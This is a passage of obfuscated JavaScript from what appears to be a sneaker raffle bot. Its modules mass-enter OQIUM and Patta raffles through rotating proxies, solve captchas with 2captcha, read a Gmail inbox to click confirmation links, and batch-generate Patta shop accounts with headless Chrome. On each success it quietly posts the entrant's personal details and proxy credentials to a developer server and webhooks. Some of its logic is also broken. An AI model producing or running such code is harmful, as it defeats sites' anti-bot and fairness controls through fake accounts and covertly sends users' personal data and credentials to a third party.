                        async function _0x343142(_0x279de9, _0x1d2c7d, _0x46f0a2, _0x23c9e3) {
                            try {
                                await _0x2dc03a(_0x1d2c7d, _0x23c9e3);
                            } catch (_0x2f3609) {
                                throw new Error(_0x2f3609);
                            }
                            async function _0x4ffbe0(_0x2da53d, _0x43aeef, _0x38043f, _0x1b0e77, _0x488823) {
                                _0x586098++;
                                var _0x41b3a7, _0x236bf5 = {}, _0x16fe28 = [], _0x2eaed0 = {}, _0x11b785 = [
                                    '40',
                                    '40.5',
                                    '41',
                                    '42',
                                    '42.5',
                                    '43',
                                    '44',
                                    '45',
                                    '45.5',
                                    '46',
                                    '47',
                                    '47.5',
                                    '48'
                                ], _0xca1be3 = Math['round'](Math['random']() * (_0x11b785['length'] - 0x1));
                                !_0x1b0e77 && (_0x1b0e77 = {});
                                if (_0x43aeef != 'ver') {
                                    _0x5bbc27(_0x38043f['name'] + '\x20Task\x20' + (_0x2da53d + 0x1) + '\x20/\x20' + _0x1b0e77['length'] + '\x20||\x20File:\x20' + _0x3d6b41 + '\x20Proxies:\x20' + _0x4629ee), _0x16fe28 = [{
                                        'type': 'rich',
                                        'title': 'Succesful\x20OQIUM\x20Entry',
                                        'description': '',
                                        'color': 0xc0d6d6,
                                        'fields': [
                                            {
                                                'name': 'User',
                                                'value': '' + _0x1544fc
                                            },
                                            {
                                                'name': 'Size',
                                                'value': '' + _0x1b0e77[_0x2da53d]['Size']
                                            },
                                            {
                                                'name': 'Delay',
                                                'value': '' + _0x4a50c2['delay']
                                            },
                                            {
                                                'name': 'Version',
                                                'value': '' + _0x539abe
                                            }
                                        ]
                                    }], _0x2eaed0 = { 'embeds': _0x16fe28 }, _0x236bf5 = _0x38043f['data'], _0x236bf5['data']['attributes']['email'] = '' + _0x1b0e77[_0x2da53d]['Email'];
                                    if (_0x1b0e77[_0x2da53d]['Size'] == 'RANDOM') {
                                    }
                                    _0x236bf5['data']['attributes']['properties']['$first_name'] = '' + _0x1b0e77[_0x2da53d]['FirstName'], _0x236bf5['data']['attributes']['properties']['$last_name'] = '' + _0x1b0e77[_0x2da53d]['LastName'], _0x236bf5['data']['attributes']['properties']['$address1'] = _0x1b0e77[_0x2da53d]['Address1'] + '\x20' + _0x1b0e77[_0x2da53d]['Address2'] + '\x20' + _0x1b0e77[_0x2da53d]['HouseNumber'], _0x236bf5['data']['attributes']['properties']['$zip'] = '' + _0x1b0e77[_0x2da53d]['Zip'], _0x236bf5['data']['attributes']['properties']['$city'] = '' + _0x1b0e77[_0x2da53d]['City'], _0x236bf5['data']['attributes']['properties']['$country'] = '' + _0x1b0e77[_0x2da53d]['Country'], _0x1b0e77[_0x2da53d]['Size'] == 'RANDOM' ? _0x236bf5['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x11b785[_0xca1be3] : _0x236bf5['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x1b0e77[_0x2da53d]['Size'], _0x236bf5['data']['attributes']['properties']['$phone_number'] = '' + _0x1b0e77[_0x2da53d]['Phone'], _0x236bf5['data']['attributes']['properties']['Instagram\x20Account'] = '' + _0x1b0e77[_0x2da53d]['Follower'];
                                }
                                if (_0x4a50c2['useRandomProxy'] = ![])
                                    var _0x5613fd = _0x488823[_0x2da53d]['split'](':');
                                else
                                    var _0x6c4df8 = Math['round'](Math['random']() * (_0x488823['length'] - 0x1)), _0x5613fd = _0x488823[_0x6c4df8]['split'](':');
                                var _0x44a0d8 = {
                                    'jar': _0x2a1dbd,
                                    'followAllRedirects': !![],
                                    'method': 'POST',
                                    'url': _0x38043f['url'],
                                    'headers': _0x38043f['headers'],
                                    'body': JSON['stringify'](_0x236bf5),
                                    'proxy': 'http://' + _0x5613fd[0x2] + ':' + _0x5613fd[0x3] + '@' + _0x5613fd[0x0] + ':' + _0x5613fd[0x1]
                                };
                                return _0x43aeef != 'ver' && (_0x44a0d8['url'] = _0x38043f['url'], _0x44a0d8['headers'] = _0x38043f['headers']), _0x43aeef == 'ver' && (_0x44a0d8['method'] = 'GET'), new Promise(function (_0x4b140e, _0x38e493) {
                                    callback = async (_0x2f6abd, _0x56d637, _0x474814) => {
                                        if (!_0x2f6abd && _0x56d637['statusCode'] == 0xca || !_0x2f6abd && _0x56d637['statusCode'] == 0xc8) {
                                            if (_0x43aeef != 'ver') {
                                                var _0x4f8e14 = await _0x530ba6(_0x1b0e77[_0x2da53d], _0x38043f, 'dev', ![]), _0x3c3b67 = await _0x530ba6(_0x1b0e77[_0x2da53d], _0x38043f, 'pub', ![]);
                                                const _0x4ce8a4 = {
                                                    'succesDEVMSG': { 'embeds': [_0x4f8e14] },
                                                    'succesPUBMSG': { 'embeds': [_0x3c3b67] }
                                                };
                                                let _0x2f4f87 = _0x1b0e77[_0x2da53d];
                                                try {
                                                    prxdata = {
                                                        'username': _0x1544fc['replace']('#', ''),
                                                        'module': _0x38043f['name'],
                                                        'entrydata': JSON['stringify'](_0x2f4f87),
                                                        'proxy': '' + _0x488823[_0x2da53d]
                                                    };
                                                    var _0x4119b9 = JSON['stringify'](prxdata);
                                                    let _0x4ebb2c = { 'headers': { 'content-type': 'application/json' } };
                                                    await _0x358674['post']('https://jraffles.herokuapp.com/success', _0x4119b9, _0x4ebb2c);
                                                } catch (_0xfd3296) {
                                                }
                                                if (_0x4a50c2['webhook'] != undefined && _0x4a50c2['webhook'] != '')
                                                    try {
                                                        await _0x313aa7(_0x4a50c2['webhook'], _0x4ce8a4['succesDEVMSG']);
                                                    } catch {
                                                    }
                                                await _0xb9a1a7(0xc8), await _0x313aa7(_0x495189, _0x4ce8a4['succesDEVMSG']), await _0xb9a1a7(0xc8);
                                                try {
                                                    await _0x313aa7(_0x40302c, _0x4ce8a4['succesPUBMSG']);
                                                } catch {
                                                }
                                                _0x5207fa(_0x1b0e77[_0x2da53d], _0x38043f);
                                            }
                                            _0x586098--, _0x4b140e(console['log'](_0x5631d3['green'](_0x5b6bc2() + '\x20[' + _0x38043f['name'] + ']\x20Task\x20' + (_0x2da53d + 0x1) + ':\x20Raffle\x20Entered!')));
                                        } else {
                                            if (_0x43aeef != 'ver') {
                                                var _0x26e9b0 = '' + _0x2f6abd, _0x534bb6 = await _0x530ba6(_0x1b0e77[_0x2da53d], _0x38043f, 'dev', !![], _0x26e9b0), _0x17b785 = {};
                                                _0x17b785['errorDEV'] = { 'embeds': [_0x534bb6] }, _0x100e1d(_0x1b0e77[_0x2da53d], _0x38043f), _0x4a50c2['webhook'] != undefined && _0x4a50c2['webhook'] != '' && await _0x313aa7(_0x4a50c2['webhook'], _0x17b785['errorDEV']), await _0x313aa7(_0x4190b7, _0x17b785['errorDEV']);
                                            }
                                            _0x586098--, _0x38e493(console['log'](_0x5631d3['red'](_0x5b6bc2() + '\x20[' + _0x38043f['name'] + ']\x20Task\x20' + (_0x2da53d + 0x1) + ':\x20' + _0x2f6abd)));
                                        }
                                    };
                                    try {
                                        _0x43aeef != 'ver' && console['log'](_0x5b6bc2() + '\x20[' + _0x38043f['name'] + ']\x20Task\x20' + (_0x2da53d + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x236bf5['data']['attributes']['email']), _0x3aab66(_0x44a0d8, callback);
                                    } catch (_0x370b70) {
                                        console['log'](_0x5b6bc2() + '\x20Task\x20' + (_0x2da53d + 0x1) + ':\x20' + _0x370b70);
                                    }
                                });
                            }
                            ;
                            try {
                                await _0x4ffbe0(_0x23c9e3, 'nor', _0x279de9, _0x1d2c7d, _0x46f0a2), console['log'](_0x5b6bc2() + '\x20[' + _0x279de9['name'] + ']\x20Sleeping\x20for\x20' + _0x4a50c2['delay'] + '\x20ms'), await _0xb9a1a7(_0x4a50c2['delay']);
                            } catch (_0x47b5c6) {
                            }
                        }
                        _0x343142(_0x33a82e, _0x3d8118, _0xd25ace, _0x3d3f73), await _0xb9a1a7(0x3e8);
                    }
                }
            },
            {
                'name': 'OQIUM\x20Raffle\x20Verification',
                'url': '',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'TFTWYv',
                            'custom_source': 'Air\x20Jordan\x201\x20Retro\x20High\x20OG\x20Lost\x20and\x20Found',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'V4PNGA',
                                '$consent_form_version': 0x6fd46d,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x4930d0, _0xdc4055, _0xb91e99) {
                    var _0xdc4055 = [], _0x106378 = ![];
                    async function _0xb88314() {
                        var _0xa2bed9 = new _0x373ca3({
                            'user': _0x4a50c2['masterMail'],
                            'password': _0x4a50c2['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x23fac2(_0x38a789) {
                            _0xa2bed9['openBox']('INBOX', ![], _0x38a789);
                        }
                        _0xa2bed9['once']('ready', function () {
                            _0x23fac2(function (_0x6940a3, _0x177e63) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x6940a3)
                                    throw _0x6940a3;
                                _0xa2bed9['seq']['search']([
                                    'UNSEEN',
                                    [
                                        'SUBJECT',
                                        'Confirm\x20Your\x20Subscription'
                                    ],
                                    [
                                        'FROM',
                                        'OQIUM'
                                    ]
                                ], function (_0x50ba2f, _0x463c5b) {
                                    if (!_0x463c5b || !_0x463c5b['length'])
                                        console['log'](_0x5b6bc2() + '\x20[' + _0x4930d0['name'] + ']\x20No\x20mails\x20found'), _0xa2bed9['end']();
                                    else {
                                        var _0x4f91c4 = _0xa2bed9['seq']['fetch'](_0x463c5b, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x4f91c4['on']('message', function (_0x4ff362, _0x57bc3b) {
                                            var _0x1c972b = '(#' + _0x57bc3b + ')\x20';
                                            _0x4ff362['on']('body', function (_0x854574, _0x28a7c4) {
                                                _0x489d8f(_0x854574, (_0x19a911, _0x45c5af) => {
                                                    var _0x59b61e = _0x45c5af['text']['split']('(')[0x1], _0x294b27 = _0x59b61e['split'](')')[0x0];
                                                    _0xdc4055['push'](_0x294b27);
                                                });
                                            }), _0x4ff362['once']('end', function () {
                                            });
                                        }), _0x4f91c4['once']('error', function (_0x33801c) {
                                            console['log']('Fetch\x20error:\x20' + _0x33801c), _0x106378 = !![];
                                        }), _0x4f91c4['once']('end', function () {
                                            _0xa2bed9['end'](), _0x106378 = !![];
                                        });
                                    }
                                });
                            });
                        }), _0xa2bed9['once']('error', function (_0x51b2f5) {
                            console['log'](_0x51b2f5), _0x106378 = !![];
                        }), _0xa2bed9['once']('end', async function () {
                            _0x106378 = !![];
                        }), _0xa2bed9['connect']();
                    }
                    async function _0x4e0f7d(_0x57cd11, _0xda2a45, _0x1f4ceb) {
                        for (var _0x3694af = 0x0; _0x3694af < _0xda2a45['length']; _0x3694af++) {
                            async function _0x55dd61(_0x354e45, _0x353c99, _0x3e054c, _0x15467a, _0x377864) {
                                var _0x1331b2, _0x10494a = {}, _0xcf3666 = [], _0x50ec3d = {}, _0x353f57 = [
                                    '40',
                                    '40,5',
                                    '41',
                                    '42',
                                    '42,5',
                                    '43',
                                    '44',
                                    '45',
                                    '45,5',
                                    '46',
                                    '47',
                                    '47,5',
                                    '48'
                                ], _0x1c0d1b = Math['round'](Math['random']() * (_0x353f57['length'] - 0x1));
                                _0x15467a[_0x354e45]['Size'] == 'RANDOM' && (_0x15467a[_0x354e45]['Size'] = _0x353f57[_0x1c0d1b]);
                                !_0x15467a && (_0x15467a = {});
                                if (_0x4a50c2['useRandomProxy'] = ![])
                                    var _0x3dca62 = _0x377864[_0x354e45]['split'](':');
                                else
                                    var _0x5ddb32 = Math['round'](Math['random']() * (_0x377864['length'] - 0x1)), _0x3dca62 = _0x377864[_0x5ddb32]['split'](':');
                                var _0x4d90b7 = {
                                    'jar': _0x2a1dbd,
                                    'followAllRedirects': !![],
                                    'method': 'POST',
                                    'url': _0x3e054c['url'],
                                    'headers': _0x3e054c['headers'],
                                    'body': JSON['stringify'](_0x10494a),
                                    'proxy': 'http://' + _0x3dca62[0x2] + ':' + _0x3dca62[0x3] + '@' + _0x3dca62[0x0] + ':' + _0x3dca62[0x1]
                                };
                                return _0x353c99 == 'ver' && (_0x4d90b7['method'] = 'GET', _0x4d90b7['url'] = _0x15467a[_0x354e45]), new Promise(function (_0x5790ec, _0x40648e) {
                                    callback = async (_0x1421b7, _0x3ce124, _0x4ac139) => {
                                        !_0x1421b7 && _0x3ce124['statusCode'] == 0xca || !_0x1421b7 && _0x3ce124['statusCode'] == 0xc8 ? _0x5790ec(console['log'](_0x5631d3['green'](_0x5b6bc2() + '\x20[' + _0x3e054c['name'] + ']\x20Task\x20' + (_0x354e45 + 0x1) + ':\x20Raffle\x20Entered!'))) : _0x40648e(console['log'](_0x5631d3['red'](_0x5b6bc2() + '\x20[' + _0x3e054c['name'] + ']\x20Task\x20' + (_0x354e45 + 0x1) + ':\x20' + _0x1421b7)));
                                    };
                                    try {
                                        _0x353c99 != 'ver' ? console['log'](_0x5b6bc2() + '\x20[' + _0x3e054c['name'] + ']\x20Task\x20' + (_0x354e45 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x10494a['data']['attributes']['email']) : console['log'](_0x5b6bc2() + '\x20[' + _0x3e054c['name'] + ']\x20Task\x20' + (_0x354e45 + 0x1) + ':\x20Fetching\x20Response'), _0x3aab66(_0x4d90b7, callback);
                                    } catch (_0xf0b47) {
                                        console['log'](_0x5b6bc2() + '\x20Task\x20' + (_0x354e45 + 0x1) + ':\x20' + _0xf0b47);
                                    }
                                });
                            }
                            ;
                            try {
                                await _0x55dd61(_0x3694af, 'ver', _0x57cd11, _0xda2a45, _0x1f4ceb), console['log'](_0x5b6bc2() + '\x20[' + _0x57cd11['name'] + ']\x20Sleeping\x20for\x20' + _0x4a50c2['delay'] + '\x20ms'), await _0xb9a1a7(_0x4a50c2['delay']);
                            } catch (_0x3d87d6) {
                                console['log'](_0x3d87d6), await _0xb9a1a7(0x2710);
                            }
                        }
                    }
                    try {
                        _0xb88314();
                        while (!_0x106378) {
                            await _0xb9a1a7(0xfa0);
                        }
                        console['log']('Found\x20' + _0xdc4055['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch (_0x4f9e1c) {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..'), console['log'](_0x4f9e1c), await _0xb9a1a7(0x2710);
                    }
                    try {
                        await _0x4e0f7d(_0x4930d0, _0xdc4055, _0xb91e99);
                    } catch (_0x2b8efe) {
                        console['log'](_0x2b8efe), await _0xb9a1a7(0x2710);
                    }
                }
            }
        ]
    },
    {
        'name': 'PATTA',
        'modules': [
            {
                'name': 'PATTA\x20Account\x20Generator',
                'store': 'Patta',
                'logo': 'https://cdn.shopify.com/s/files/1/0473/6965/0340/collections/patta_42f8af38-44b4-4c1b-a6f3-ec368a7b6f58_1200x1200.jpg?v=1665406562',
                'function': async function (_0xf67473, _0x401b7c, _0x228d9a) {
                    _0x14f2e1['use'](_0x3313a5()), _0x14f2e1['use'](_0x2255ea({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x4a50c2['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x1026ca = 0x0; _0x1026ca < _0x401b7c['length']; _0x1026ca++) {
                        var _0x237964 = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Patta\x20Account\x20Generated',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x1544fc
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x4a50c2['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x539abe
                                }
                            ]
                        }];
                        const _0x299607 = { 'embeds': _0x237964 };
                        _0x5bbc27(_0xf67473['name'] + '\x20Task\x20' + (_0x1026ca + 0x1) + '\x20/\x20' + _0x401b7c['length'] + '\x20||\x20File:\x20' + _0x3d6b41 + '\x20Proxies:\x20' + _0x4629ee);
                        try {
                            await _0x2dc03a(_0x401b7c, _0x1026ca);
                        } catch {
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        var _0x1ed6f6 = await _0x530ba6(_0x401b7c[_0x1026ca], _0xf67473, 'acc', ![]);
                        const _0x8abc96 = { 'succesDEVMSG': { 'embeds': [_0x1ed6f6] } };
                        if (_0x401b7c[_0x1026ca]['Email'] == '' || _0x401b7c[_0x1026ca]['FirstName'] == '' || _0x401b7c[_0x1026ca]['LastName'] == '') {
                            console['log'](_0x5b6bc2() + '\x20[' + _0x2a4370[taskModule]['name'] + ']\x20Task\x20' + (_0x1026ca + 0x1) + '\x20:\x20Invalid\x20CSV'), await _0xb9a1a7(0x7d0);
                            continue;
                        }
                        (_0x401b7c[_0x1026ca]['Password'] == '' || _0x401b7c[_0x1026ca] == undefined) && _0x401b7c[_0x1026ca]['Password'] == 'JRaffles23!';
                        if (_0x4a50c2['useRandomProxy'] = ![])
                            var _0xcaa7c5 = _0x228d9a[_0x1026ca]['split'](':');
                        else
                            var _0x938530 = Math['round'](Math['random']() * (_0x228d9a['length'] - 0x1)), _0xcaa7c5 = _0x228d9a[_0x938530]['split'](':');
                        var _0x22671e;
                        try {
                            _0x22671e = await _0x14f2e1['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0xcaa7c5[0x0] + ':' + _0xcaa7c5[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x22671e = await _0x14f2e1['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0xcaa7c5[0x0] + ':' + _0xcaa7c5[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x166025 = await _0x22671e['newPage']();
                            await _0x166025['authenticate']({
                                'username': '' + _0xcaa7c5[0x2],
                                'password': '' + _0xcaa7c5[0x3]
                            }), console['log'](_0x5b6bc2() + '\x20[' + _0xf67473['name'] + ']\x20Task\x20' + (_0x1026ca + 0x1) + '\x20:\x20Getting\x20Session'), await _0x166025['setRequestInterception'](!![]), _0x166025['on']('request', _0x54562f => {
                                _0x54562f['resourceType']() === 'image' || _0x54562f['resourceType']() === 'font' || _0x54562f['resourceType']() === 'media' ? _0x54562f['abort']() : _0x54562f['continue']();
                            }), await _0x166025['goto']('https://patta.nl/account/register'), await _0xb9a1a7(0xbb8), await _0x166025['waitForSelector']('#RegisterForm-FirstName'), console['log'](_0x5b6bc2() + '\x20[' + _0xf67473['name'] + ']\x20Task\x20' + (_0x1026ca + 0x1) + '\x20:\x20Filling\x20information'), await _0x166025['type']('#RegisterForm-FirstName', '' + _0x401b7c[_0x1026ca]['FirstName']), await _0xb9a1a7(0x226), await _0x166025['type']('#RegisterForm-LastName', '' + _0x401b7c[_0x1026ca]['LastName']), await _0xb9a1a7(0x226), await _0x166025['type']('#RegisterForm-email', '' + _0x401b7c[_0x1026ca]['Email']), await _0xb9a1a7(0x226), await _0x166025['type']('#RegisterForm-password', '' + _0x401b7c[_0x1026ca]['Password']), await _0xb9a1a7(0x226), console['log'](_0x5b6bc2() + '\x20[' + _0xf67473['name'] + ']\x20Task\x20' + (_0x1026ca + 0x1) + '\x20:\x20Submitting..'), await _0x166025['$eval']('#RegisterForm', _0x4a1179 => _0x4a1179['submit']()), await _0xb9a1a7(0x1f40);
                            try {
                                await _0x166025['waitForSelector']('.home-page-grid__collection'), await _0xb9a1a7(0x1f4), console['log'](_0x5631d3['green'](_0x5b6bc2() + '\x20[' + _0xf67473['name'] + ']\x20Task\x20' + (_0x1026ca + 0x1) + '\x20:\x20Account\x20' + _0x401b7c[_0x1026ca]['Email'] + '\x20Generated!')), _0xf38118['appendFileSync']('../accounts/patta.csv', '\x0a' + _0x401b7c[_0x1026ca]['Email'] + ',' + _0x401b7c[_0x1026ca]['Password']), console['log'](_0x5631d3['yellow'](_0x5b6bc2() + '\x20[' + _0xf67473['name'] + ']\x20Task\x20' + (_0x1026ca + 0x1) + '\x20:\x20Account\x20' + _0x401b7c[_0x1026ca]['Email'] + '\x20Saved\x20in\x20\x27accounts/patta.csv\x27'));
                                try {
                                    _0x4a50c2['webhook'] != undefined && _0x4a50c2['webhook'] != '' && await _0x313aa7(_0x4a50c2['webhook'], _0x8abc96['succesDEVMSG']);
                                } catch {
                                }
                                await _0x313aa7(_0x54bd15, _0x8abc96['succesDEVMSG']);
                            } catch (_0x685278) {
                                console['log'](_0x5631d3['red'](_0x5b6bc2() + '\x20[' + _0x2a4370[taskModule]['name'] + ']\x20Task\x20' + (_0x1026ca + 0x1) + '\x20:\x20Account\x20genration\x20failed.\x20' + _0x685278));
                            }
                        } catch (_0x1464b2) {
                            console['log'](_0x5631d3['red'](_0x5b6bc2() + '\x20[' + _0x2a4370[taskModule]['name'] + ']\x20Task\x20' + (_0x1026ca + 0x1) + '\x20:\x20' + _0x1464b2));
                        } finally {
                            _0x22671e && _0x22671e['close'](), console['log']('Waiting\x20for\x20' + _0x4a50c2['delay'] + '\x20ms'), await _0xb9a1a7(_0x4a50c2['delay']);
                        }
                    }
                }
            },
            {
                'name': 'PATTA\x20Raffle\x20Entries',
                'store': 'Patta',
                'logo': 'https://cdn.shopify.com/s/files/1/0473/6965/0340/collections/patta_42f8af38-44b4-4c1b-a6f3-ec368a7b6f58_1200x1200.jpg?v=1665406562',
                'function': async function (_0x57d6d7, _0x1417c4, _0x480f5e) {
                    _0x14f2e1['use'](_0x3313a5()), _0x14f2e1['use'](_0x2255ea({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x4a50c2['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x3bee67 = 0x0; _0x3bee67 < _0x1417c4['length']; _0x3bee67++) {
                        var _0x2416e1;
                        if (_0x416137 != 'yes')
                            var _0x416137 = '', _0x327ab9 = 0x0;
                        _0x5bbc27(_0x57d6d7['name'] + '\x20Task\x20' + (_0x3bee67 + 0x1) + '\x20/\x20' + _0x1417c4['length'] + '\x20||\x20File:\x20' + _0x3d6b41 + '\x20Proxies:\x20' + _0x4629ee);
                        try {
                            await _0x2dc03a(_0x1417c4, _0x3bee67);
                        } catch {
                            _0x416137 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        if (_0x1417c4[_0x3bee67]['Email'] == '' || _0x1417c4[_0x3bee67]['Password'] == '' || _0x1417c4[_0x3bee67]['FirstName'] == '' || _0x1417c4[_0x3bee67]['LastName'] == '') {
                            console['log'](_0x5b6bc2() + '\x20[' + _0x2a4370[taskModule]['name'] + ']\x20Task\x20' + (_0x3bee67 + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        if (_0x4a50c2['useRandomProxy'] = ![])
                            var _0x4d7049 = _0x480f5e[_0x3bee67]['split'](':');
                        else
                            var _0x17f206 = Math['round'](Math['random']() * (_0x480f5e['length'] - 0x1)), _0x4d7049 = _0x480f5e[_0x17f206]['split'](':');
                        var _0x2514ba;
                        try {
                            _0x2514ba = await _0x14f2e1['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x4d7049[0x0] + ':' + _0x4d7049[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x2514ba = await _0x14f2e1['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x4d7049[0x0] + ':' + _0x4d7049[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x1d55dc = await _0x2514ba['newPage']();
                            await _0x1d55dc['authenticate']({
                                'username': '' + _0x4d7049[0x2],
                                'password': '' + _0x4d7049[0x3]
                            }), console['log'](_0x5b6bc2() + '\x20[' + _0x57d6d7['name'] + ']\x20Task\x20' + (_0x3bee67 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x1d55dc['setRequestInterception'](!![]), _0x1d55dc['on']('request', _0x578353 => {
                                _0x578353['resourceType']() === 'image' || _0x578353['resourceType']() === 'font' || _0x578353['resourceType']() === 'media' ? _0x578353['abort']() : _0x578353['continue']();
                            }), await _0x1d55dc['goto']('https://www.patta.nl/nl/account/login', {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x1d55dc['waitForSelector']('#CustomerEmail'), console['log'](_0x5b6bc2() + '\x20[' + _0x57d6d7['name'] + ']\x20Task\x20' + (_0x3bee67 + 0x1) + '\x20:\x20Logging\x20in..'), await _0x1d55dc['type']('#CustomerEmail', '' + _0x1417c4[_0x3bee67]['Email']), await _0xb9a1a7(0x12c), await _0x1d55dc['type']('#CustomerPassword', '' + _0x1417c4[_0x3bee67]['Password']), await _0xb9a1a7(0x226), await _0x1d55dc['$eval']('#customer_login', _0x11fac6 => _0x11fac6['submit']());
                            try {
                                await _0x1d55dc['waitForSelector']('#orders'), await _0xb9a1a7(0x4b0);
                            } catch {
                                console['log'](_0x5631d3['red'](_0x5b6bc2() + '\x20[' + _0x57d6d7['name'] + ']\x20Task\x20' + (_0x3bee67 + 0x1) + '\x20:\x20Task\x20failed,\x20invalid\x20credentials'));
                                continue;
                            }
                            await _0x1d55dc['goto']('' + _0x1417c4[_0x3bee67]['Url'], {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0xb9a1a7(0xbb8), console['log'](_0x5b6bc2() + '\x20[' + _0x57d6d7['name'] + ']\x20Task\x20' + (_0x3bee67 + 0x1) + '\x20:\x20Starting\x20Entry');
                            try {
                                await _0x1d55dc['waitForSelector']('#email');
                            } catch {
                                console['log'](_0x5631d3['red'](_0x5b6bc2() + '\x20[' + _0x57d6d7['name'] + ']\x20Task\x20' + (_0x3bee67 + 0x1) + '\x20:\x20Duplicate\x20entry/\x20Account\x20error'));
                            }
                            await _0x1d55dc['type']('#email', '' + _0x1417c4[_0x3bee67]['Email']), await _0xb9a1a7(0x384), await _0x1d55dc['type']('#first_name', '' + _0x1417c4[_0x3bee67]['FirstName']), await _0xb9a1a7(0x514), await _0x1d55dc['type']('#last_name', '' + _0x1417c4[_0x3bee67]['LastName']), await _0xb9a1a7(0x514), await _0x1d55dc['type']('#street_address', _0x1417c4[_0x3bee67]['Address1'] + '\x20' + _0x1417c4[_0x3bee67]['HouseNumber'] + '\x20' + _0x1417c4[_0x3bee67]['Address2']), await _0xb9a1a7(0x2bc);
                            _0x1417c4[_0x3bee67]['Postcode'] == undefined && (_0x1417c4[_0x3bee67]['Postcode'] = _0x1417c4[_0x3bee67]['Zip']);
                            await _0x1d55dc['type']('#zip_code', '' + _0x1417c4[_0x3bee67]['Postcode']), await _0xb9a1a7(0x320), await _0x1d55dc['type']('#city', '' + _0x1417c4[_0x3bee67]['City']), await _0xb9a1a7(0x320), await _0x1d55dc['type']('#bday', '01/01/1994'), await _0xb9a1a7(0x320), await _0x1d55dc['type']('#instagram', '' + _0x1417c4[_0x3bee67]['Follower']), await _0xb9a1a7(0x352);
                            if (_0x1417c4[_0x3bee67]['Size'] == 'RANDOM') {
                                const _0x3b5076 = await _0x1d55dc['$$eval']('div[id=\x22raffle__size-selector-container\x22]\x20>\x20label', _0x5d392f => {
                                    return _0x5d392f['map'](_0xe4a7ec => _0xe4a7ec['textContent']);
                                });
                                var _0x390fa9 = Math['round'](Math['random']() * (_0x3b5076['length'] - 0x1));
                                console['log'](_0x5b6bc2() + '\x20[' + _0x57d6d7['name'] + ']\x20Task\x20' + (_0x3bee67 + 0x1) + '\x20:\x20Picking\x20Random\x20Size\x20' + _0x3b5076[_0x390fa9]), await _0x1d55dc['click']('label[data-eu-size=\x22' + _0x3b5076[_0x390fa9] + '\x22]');
                            } else {
